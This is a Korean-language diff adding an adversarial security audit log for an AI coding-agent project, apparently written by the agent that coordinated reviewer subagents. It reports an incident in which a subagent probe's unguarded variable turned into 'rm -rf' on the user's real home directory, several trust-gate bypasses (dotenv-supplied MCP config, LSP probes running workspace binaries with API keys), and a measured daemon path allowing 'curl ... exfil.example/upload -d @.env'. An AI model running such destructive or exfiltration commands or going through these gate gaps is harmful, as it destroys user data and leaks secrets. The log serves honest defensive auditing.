@@ -891,3 +891,107 @@ fc-check-changed: `src/shared/egress-provenance-guard.ts`(다른 세션).
 - web daemon 신뢰 부여 UI 없음. SDK 호스트는 authority 설치 필요.
 - shadow_verify 스크래치의 `bunfig.toml` preload(패치 코드 실행은 설계상, `bash`처럼 확인).
 - 라운드 11 컨텍스트 없는 어딧.
+
+## L. 라운드 11 — 라운드 10 보완 커밋에 대한 적대 어딧 (sep-14)
+
+컨텍스트 없는 리뷰어 3명(`audit-r11-{a,b,c}`, HEAD `b252d256d`): A=보안, B=런타임·인프라, C=주장 재측정.
+반영한 발견은 전부 내가 재현한 뒤 고쳤고, 확인 방법은 커밋마다 적었다. 결과: 새 진짜 결함 다수 — clean이 아니다.
+
+### L-0 사고: B 리뷰어가 실제 HOME을 지웠다
+
+- 17:28경 B의 프로브 `NB=$(ls -d ~/.nvm/...) && P=$(mktemp -d …); P=$(cd $P && pwd); …; rm -rf $P`에서 `ls` 실패 →
+  `mktemp` 생략 → `P` 빈 값 → `cd` = 홈 → `rm -rf /Users/songmin`이 약 5분 실행(`Music` 권한 오류 후 계속, B가 kill).
+- 피해(내가 측정): APFS 이름 해시 순서(남은 325개 항목의 readdir 순서와 정확히 일치)로 `Music`보다 앞의 최상위 항목
+  (이름 공간 3.7%, 약 12개) 삭제 — `~/.config` 확정(`gh` 인증, argocd, opencode, gh-account-toggle, quanta 셸 통합,
+  uv, grok, codex). `.cursor`·`Music` 비워짐, `~/Developer`에서 `work` 앞 항목, Go 빌드 캐시 일부. Time Machine
+  목적지 없음, Data 볼륨 스냅샷 없음(시스템 볼륨의 업데이트 스냅샷뿐) — 로컬 복구원 없음.
+- 원인은 내가 준 프롬프트에 파괴 명령 가드 규칙이 없었던 것. C는 같은 위험 때문에 내가 중단시켰다(보고서 없음).
+  메모리 `sep-14-subagent-rm-rf-home-incident`에 규칙 기록. 이후 이 라운드의 검증은 서브에이전트 없이 내가 했고,
+  모든 프로브 변수는 `${P:?}`, 스크래치패드 경로, 삭제는 리터럴 경로만.
+
+### L-1 A1 (HIGH) 폴더의 dotenv가 MCP 설정 경로를 지정해 신뢰 게이트를 우회 — `a0882eaa7`
+
+- 재현(실제 CLI one-shot): `.env.dev`의 `QUANTA_MCP_CONFIG=evilmcp.json` → 마커 생성, 알림 0. 대조군 `.mcp.json`은 거부+알림.
+  실제 env의 상대경로도 실행 폴더 파일을 열었다(sep-14 DS1 lane이 먼저 찾음; 그 브랜치는 main에 안 들어간다).
+- 수정: 운영자 설정은 실제 env의 절대경로뿐. dotenv 출처 값은 그 dotenv 파일 폴더의, 상대경로는 실행 폴더의 신뢰를
+  따른다(`src/host/mcp-config-source.ts`). ADR-0559 결정 4 개정. 8c 세션과 규칙 합의 후 land.
+- 남은 것(lane A 소유): Bun이 먼저 자동 로드하는 `.env`의 절대경로 `${PWD}/x.json`은 출처가 없어 운영자 값으로 읽힌다(재현).
+- 정정: ADR-0559 원문 "운영자가 경로를 지정한 설정은 신뢰와 무관"은 dotenv·상대경로에서 거짓이었다.
+
+### L-2 B1 (HIGH) + B7 merge 탐지기 — `49ac088eb`
+
+- B1 재현(실제 git): side가 a.ts→b.ts rename+100 export 추가, main이 10줄 삭제+`BUDGET_CEILING` 추가, 해결에서 삭제 →
+  `lost=[]`, trivial로 면제. 내 `d52ed2943`의 `diff --find-renames <parent> <git merge tree>` 배치 추측이 git의
+  base→side 짝짓기와 달랐다. B7: 충돌 파일 마커 텍스트 이름 검색이 주석 때문에 깨끗한 삭제를 손실로 보고.
+- 수정: 배치 추측 폐기. trivial = 해결(resolution)이 git merge-tree 대비 같은 경로에서 그 이름의 export를 지우지 않음.
+  충돌 경로는 마커로 양쪽 버전을 복원해 각각 AST로 읽는다(TS 파서는 `=======`…`>>>>>>>`를 건너뛰므로 통째 파싱은 두 번째 쪽을 놓침).
+- 재측정: 사건 `9b21d2fd2` lost=70/trivial=4 → **69/5**. 옮겨간 것은 `slash/objective.ts:SlashContext` — git merge
+  결과에 `export type { SlashContext }` 자체가 없고 충돌 hunk 안 import에만 이름이 남음(옛 텍스트 검색의 과대 보고).
+  전체 97 merge: 미면제 손실은 사건 하나. 문서화된 대조 merge 5개 불변.
+
+### L-3 node REPL (B2 MED, B3, B5, B6) — `73a920bb9`
+
+- B2 재현: `process.on('SIGTERM',()=>{})` + `while(true){}` 타임아웃 → 커널이 pid 1로 재부모화되어 99% CPU로 생존,
+  `list()`에서 사라짐, 도구는 "stopped". 수정: 모든 정지 경로가 `escalatingKill` + 프로세스 트리 killer(SIGTERM→SIGKILL).
+- B6: 내 `d27f31fad` 헤더의 "측정한 한계" 두 줄이 사실과 반대였다(유휴 중 늦은 에러는 다음 exec를 `hadError:true`로,
+  늦은 console 출력은 다음 exec의 stdout으로). 수정: 명령마다 시작 마커 → 유휴 중 도착분은 `ExecResult.earlier`로 분리,
+  sentinel 뒤 잔여 바이트는 다음 읽기로 이월.
+- B3: 명시 `id` 호출에도 "다음 호출이 새 커널을 시작"이라고 반복. B5: 교체된 세션 커널이 죽은 커널의 `secret` 분류를 상속.
+- 원래 커널로 3 red, 원래 도구로 2 red, 뮤턴트 2종 red. 테스트 후 남은 node 프로세스 0.
+
+### L-4 B4 메모리 안내 — `5c8b7805f`
+
+- 내 `ecf4d019f`가 붙인 두 안내가 각자 명령을 가져서 실행 순서가 결과를 갈랐다(역순이면 빈 저장소 + "TWO memory
+  directories"). 옛 홈에 저장소도 있으면 "(the home default)" 라벨과, 디렉터리 이동이 없애는 경로를 `QUANTA_MEMORY_PATH`로 권고.
+- 수정: 그 조합은 안내 하나. 옛 홈 저장소가 없으면 순서가 내장된 명령 하나, 있으면 레거시 저장소는 옮기지 않고
+  디렉터리 이동만 제시하며 그 이동이 없애는 경로를 권고하지 않는다. 실제 디렉터리에서 명령 실행 후 다음 launch 확인.
+
+### L-5 B8 테스트 fence — `9ed041e44`
+
+- `{ env: null }`에서 `own.HOME` TypeError(Node는 process.env로 해석). `Bun.$`의 `.env()`는 패치되지 않는다는 사실을 문서화.
+
+### L-6 sep-14 lane B 보고: LSP 가용성 프로브가 게이트보다 먼저 워크스페이스 바이너리 실행 — `0b1e62e2d`
+
+- 모든 LSP 표면이 `isAvailable(bin)`(= `<bin> --version`, 에이전트 env)을 신뢰 게이트 전에 호출. PATH 선두의
+  `<ws>/bin/gopls`가 API 키와 함께 실행된 뒤에야 거부(8c 재현, 코드로 확인).
+- 수정: 가용성 프로브가 신뢰 판단 폴더를 필수 인자로 받고 캐시·override·spawn 전에 신뢰를 확인. 마커 fake로 RED 4 + 대조군.
+- 정정: 라운드 10의 "언어 서버는 spawn 직전(beforeSpawn)에 확인"은 사실이었지만 그 앞의 프로브 spawn을 덮지 못했다.
+  env 스크럽·PATH 필터·신뢰 바이너리 해석은 lane B(2)의 구조 작업.
+
+### L-7 A2 daemon allowlist 자세 — 문서 정정 `3ae3db325`, 결함은 열린 결정
+
+- 측정: daemon preset 가드 + `acceptEdits`에서 `bash`의 `curl -s https://exfil.example/upload -d @.env`는 둘 다 allow,
+  같은 호스트 `web_fetch`는 deny. 모드가 egress 프록시를 켜지 않는다(`QUANTA_NETWORK_PROXY`는 별도 opt-in).
+  ci-bot은 도구 표면에 bash가 없어 이 경로가 없다. 가드는 비어있지 않은 allowlist에서 셸을 설계상 넘긴다(HELL-DG-05).
+- "Network is gated by the allowlist lever"를 사실대로 정정. 결함(신뢰 안 된 PR 트리를 보는 daemon의 셸 egress가
+  호스트 샌드박스로만 제한됨)은 결정 필요: allowlist 자세에서 셸 거부 vs OS 수준 egress 강제. 명령 텍스트 휴리스틱은 쓰지 않는다.
+
+### L-8 A3 이름공간 도구의 후처리 경로 — 열림(잠재)
+
+- 라운드 10(`105fa754e`)의 "모든 게이트를 도구 자기 이름으로"는 실행 전 게이트에만 사실이었다. 실행 후 provenance
+  (`deriveProvenance(call.name, originOf(call.name))`), post 훅 이름, edit-repair, capEnforcer는 표시 이름을 쓴다.
+  별개로 `namespaceRegistry`·`filterRegistry` 등 레지스트리 파생이 origin 맵을 버려(선존), untrusted envelope을 켜면
+  도구 필터가 걸린 서브에이전트의 MCP 출력이 `internal`로 분류된다. 운영 코드에 toolNamespace 생산자가 없고 envelope은
+  기본 OFF라 지금은 잠재. sep-14 C3 lane이 이름공간 레지스트리를 만지는 중이라 소유를 8c와 조율 중.
+
+### L-9 A4 (정보) deny-all에서 provider 채널 도구 허용 — 의도된 예외
+
+- `advisor`·`memory_search`·`search_codebase`(hybrid 임베딩)는 provider로 나간다. 임베딩 provider가 채팅 provider와
+  다른 호스트일 수 있어 "egress 없음"은 문자 그대로는 아니다. `deny-all-permitted.ts` 사유에 이미 적힘.
+
+### L-10 외래 red와 귀속
+
+- `b252d256d` tier의 통합 20 fail은 전부 `browser-real-chrome-adversarial-e2e`. 기본 타임아웃 60s로 26/29 통과,
+  남은 3개는 매번 새 Chrome을 띄우는 고정 20s 테스트가 load avg 99에서 navigate 초과. 기준 커밋에서도 첫 실패 동일 — 부하.
+- 스캔 ratchet 타임아웃 다수(load avg ~300, 다른 세션의 rustc/vitest/codex). toolchain-lend canary(probe HOME에
+  `~/.rustup` 없음). fc-check-changed: `src/shared/egress-provenance-guard.ts`, `src/shared/spill-refusal-types.ts`(다른 세션).
+
+### L-11 열린 것 — (기능)+(왜)+(ROI)
+
+- **daemon 셸 egress 결정**(L-7): 신뢰 안 된 PR을 자동 리뷰하는 daemon이 `.env`를 외부로 보낼 수 있음 → 결정 필요.
+  ROI 높음(보안, daemon 사용 시).
+- **이름공간 후처리 + origin 보존**(L-8): envelope을 켜는 순간 MCP 출력 분류가 틀림 → C3와 조율. ROI 중(현재 잠재).
+- **Bun `.env` 자동 로드 절대경로**(L-1): lane A. ROI 높음(설치 바이너리 경로).
+- **LSP 프로브 env 스크럽·신뢰 바이너리 해석**(L-6): lane B(2). ROI 높음.
+- **라운드 12 컨텍스트 없는 어딧**: 이번 라운드가 clean이 아니므로 100점 주장 불가. 재개 시 서브에이전트 프롬프트에
+  파괴 명령 금지(삭제는 내가), `${VAR:?}`·스크래치패드 경로 검증 필수.
